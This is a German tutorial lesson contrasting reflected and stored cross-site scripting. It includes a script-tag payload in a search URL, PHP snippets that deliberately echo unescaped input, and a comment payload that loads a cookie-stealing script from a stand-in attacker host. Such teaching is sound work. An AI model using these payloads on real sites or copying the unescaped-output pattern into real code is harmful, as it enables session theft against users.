# Reflected vs. Stored XSS

### Reflektiertes vs. Gespeichertes XSS: Ein genauer Blick auf die Angriffsvektoren

Du weißt bereits, dass Cross-Site Scripting (XSS) darauf abzielt, bösartigen JavaScript-Code im Browser eines anderen Benutzers auszuführen, indem eine anfällige Webseite als Medium missbraucht wird. Das Ziel ist immer dasselbe: die Same-Origin Policy zu umgehen und Aktionen im Namen des Opfers durchzuführen, wie zum Beispiel das Stehlen von Session-Cookies. Doch der Weg, auf dem der schädliche Code (der sogenannte „Payload“) zum Opfer gelangt, unterscheidet sich fundamental. Hier trennt sich die Spreu vom Weizen und wir lernen die beiden prominentesten XSS-Arten kennen: reflektiertes (non-persistent) und gespeichertes (persistent) XSS.

#### Reflektiertes XSS: Der Bumerang-Angriff

Stell dir vor, du rufst etwas in eine Schlucht und das Echo kommt sofort zurück. Reflektiertes XSS funktioniert nach einem ähnlichen Prinzip. Der bösartige Code ist Teil der Anfrage (Request), die an den Server gesendet wird, und wird von diesem in der Antwort (Response) direkt und ohne Speicherung „reflektiert“.

Der Angriffsvektor ist hier meist ein manipulierter Link. Der Angreifer muss sein Opfer dazu bringen, auf diesen Link zu klicken. Typische Kanäle dafür sind Phishing-E-Mails, private Nachrichten in sozialen Netzwerken oder Beiträge in öffentlichen Foren. Der Link führt zu einer legitimen, aber anfälligen Webseite.

**Wie funktioniert das genau?**

1.  **Der Köder:** Ein Angreifer identifiziert eine Webseite mit einer Sicherheitslücke. Ein klassisches Beispiel ist eine Suchfunktion, die den Suchbegriff auf der Ergebnisseite anzeigt. Die URL könnte so aussehen: `https://eine-webseite.de/suche?q=mein-suchbegriff`.
2.  **Die Manipulation:** Der Angreifer präpariert nun diese URL, indem er anstelle eines harmlosen Suchbegriffs ein JavaScript-Payload einfügt. Zum Beispiel:
    `https://eine-webseite.de/suche?q=<script>alert('XSS-Angriff!')</script>`
3.  **Die Falle:** Der Angreifer schickt diesen Link an ein Opfer. Die Nachricht könnte lauten: „Schau mal, was ich hier Tolles gefunden habe!“
4.  **Die Ausführung:** Das Opfer klickt auf den Link. Sein Browser sendet eine Anfrage an `eine-webseite.de`. Der Server empfängt die Anfrage, extrahiert den Parameter `q` und baut ihn direkt in die HTML-Seite ein, die er zurück an das Opfer sendet.

Nehmen wir an, der serverseitige Code (hier vereinfacht in PHP) sieht so aus:

```php
<?php
  $searchTerm = $_GET['q'];
?>
<!DOCTYPE html>
<html>
<head>
  <title>Suchergebnisse</title>
</head>
<body>
  <h1>Suchergebnisse für: <?php echo $searchTerm; ?></h1>
  <!-- ... weitere Ergebnisse ... -->
</body>
</html>
```

Wenn das Opfer auf den manipulierten Link klickt, erzeugt dieser PHP-Code folgenden HTML-Output, der an den Browser des Opfers gesendet wird:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Suchergebnisse</title>
</head>
<body>
  <h1>Suchergebnisse für: <script>alert('XSS-Angriff!')</script></h1>
  <!-- ... weitere Ergebnisse ... -->
</body>
</html>
```

Der Browser des Opfers empfängt diesen Code, interpretiert ihn und stößt auf das `<script>`-Tag. Da der Code von einer vertrauenswürdigen Domain (`eine-webseite.de`) stammt, führt der Browser das Skript ohne zu zögern aus. Das `alert()`-Fenster erscheint. Ein echter Angreifer würde hier natürlich kein harmloses `alert()` verwenden, sondern Code, der beispielsweise die Session-Cookies des Benutzers an seinen eigenen Server sendet.

**Die wichtigsten Merkmale von reflektiertem XSS:**

*   **Nicht-persistent:** Der Schadcode wird nicht auf dem Server gespeichert. Er existiert nur für die Dauer der Anfrage und Antwort. Schließt der Benutzer den Tab, ist der Angriff vorbei.
*   **Soziale Interaktion nötig:** Der Angriff funktioniert nur, wenn das Opfer aktiv auf einen manipulierten Link klickt.
*   **Der Payload ist sichtbar:** Oftmals ist der Schadcode direkt in der URL-Leiste des Browsers zu erkennen, was misstrauische Benutzer warnen könnte.

---

#### Gespeichertes XSS: Die tickende Zeitbombe

Gespeichertes XSS ist die deutlich gefährlichere Variante. Hier wird der bösartige Code dauerhaft auf dem Zielserver gespeichert, typischerweise in einer Datenbank. Jedes Mal, wenn ein Benutzer die betroffene Seite aufruft, wird der Schadcode vom Server zusammen mit dem restlichen Inhalt ausgeliefert und im Browser des Besuchers ausgeführt.

Im Gegensatz zum reflektierten XSS muss der Angreifer hier nicht jeden Benutzer einzeln per Link ködern. Er platziert seinen Payload einmal, und die Webseite übernimmt die Verteilung für ihn.

**Wie funktioniert das genau?**

1.  **Der Infiltrationspunkt:** Der Angreifer findet auf einer Webseite eine Funktion, die Benutzereingaben entgegennimmt und dauerhaft speichert. Typische Beispiele sind Kommentarfunktionen in Blogs, Beiträge in Foren, Nutzernamen in Profilen oder Produktbewertungen in einem Online-Shop.
2.  **Die Injektion:** Der Angreifer gibt seinen JavaScript-Payload in ein Eingabefeld ein und sendet es ab. Zum Beispiel in einem Kommentarfeld:
    `Ein wirklich guter Beitrag! <script src="https://angreifer-server.de/cookie-dieb.js"></script>`
3.  **Die Speicherung:** Die anfällige Webanwendung nimmt diesen Kommentar entgegen und speichert ihn – ohne ihn zu bereinigen (sanitizing) – in ihrer Datenbank. Aus Sicht des Servers ist das einfach nur ein weiterer Text-Kommentar.
4.  **Die Verteilung:** Nun besucht ein unbeteiligter, ahnungsloser Benutzer dieselbe Seite, um die Kommentare zu lesen.
5.  **Die Ausführung:** Die Webanwendung holt alle Kommentare aus der Datenbank – inklusive des bösartigen Kommentars – und fügt sie in die HTML-Seite ein, die sie an den Besucher ausliefert.

Ein vereinfachtes PHP-Skript, das Kommentare ausgibt, könnte so aussehen:

```php
<?php
  // $comments ist ein Array mit Kommentaren aus der Datenbank
  foreach ($comments as $comment) {
    echo "<div class='comment-box'>";
    echo "<p class='comment-author'>" . $comment['author'] . "</p>";
    echo "<p class='comment-text'>" . $comment['text'] . "</p>";
    echo "</div>";
  }
?>
```

Wenn der bösartige Kommentar geladen wird, sieht der resultierende HTML-Code, der an den Browser des Opfers geht, so aus:

```html
<div class='comment-box'>
  <p class='comment-author'>Angreifer</p>
  <p class='comment-text'>Ein wirklich guter Beitrag! <script src="https://angreifer-server.de/cookie-dieb.js"></script></p>
</div>
```

Der Browser des Opfers lädt diese Seite, erkennt das `<script>`-Tag und lädt und führt die Datei `cookie-dieb.js` vom Server des Angreifers aus. Dieses Skript kann nun im Kontext der vertrauenswürdigen Webseite agieren und beispielsweise die Cookies des Opfers an den Angreifer senden. Jeder einzelne Besucher, der diese Seite aufruft, wird zum Opfer, bis der bösartige Eintrag aus der Datenbank entfernt wird.

**Die wichtigsten Merkmale von gespeichertem XSS:**

*   **Persistent:** Der Schadcode ist dauerhaft auf dem Server gespeichert und wird automatisch an viele Benutzer ausgeliefert.
*   **Keine soziale Interaktion nötig (nach der Injektion):** Die Opfer müssen nur die kompromittierte Seite besuchen. Sie müssen nicht auf einen speziellen Link klicken.
*   **Hohe Reichweite:** Ein einziger erfolgreicher Angriff kann Tausende von Benutzern treffen.
*   **Der Payload ist unsichtbar:** Der Schadcode ist nicht in der URL sichtbar, was die Erkennung für den normalen Benutzer unmöglich macht.

#### Der entscheidende Unterschied: Flüchtigkeit vs. Beständigkeit

Der Kernunterschied liegt im Lebenszyklus des Payloads. Bei **reflektiertem XSS** ist der Payload flüchtig. Er reist mit der Anfrage zum Server und wird sofort mit der Antwort zurückgeworfen. Er hat keine Heimat auf dem Server. Man könnte sagen, der Angreifer wirft einen infizierten Ball gegen eine Wand, und nur wer genau in der Flugbahn des zurückprallenden Balls steht, wird getroffen.

Bei **gespeichertem XSS** hingegen findet der Payload ein Zuhause auf dem Server. Er nistet sich in der Datenbank ein und wartet geduldig. Die Webseite wird unwissentlich zum Komplizen und verteilt den Schadcode an jeden, der vorbeikommt. Der Angreifer muss nur einmal eine "Landmine" platzieren, die dann immer wieder auslöst.

Aus diesem Grund gilt gespeichertes XSS im Allgemeinen als die weitaus gefährlichere Bedrohung. Seine Fähigkeit, sich passiv und breit zu verteilen, verleiht ihm ein enormes Schadenspotenzial. Während ein reflektierter XSS-Angriff oft gezielt gegen Einzelpersonen oder kleine Gruppen gerichtet ist, kann ein gespeicherter XSS-Angriff eine ganze Benutzerbasis kompromittieren und den Ruf einer Webseite nachhaltig schädigen. Beide sind ernstzunehmende Bedrohungen, doch die Fähigkeit des gespeicherten XSS, sich wie ein stiller Virus zu verbreiten, macht es zu einer besonders heimtückischen Gefahr.
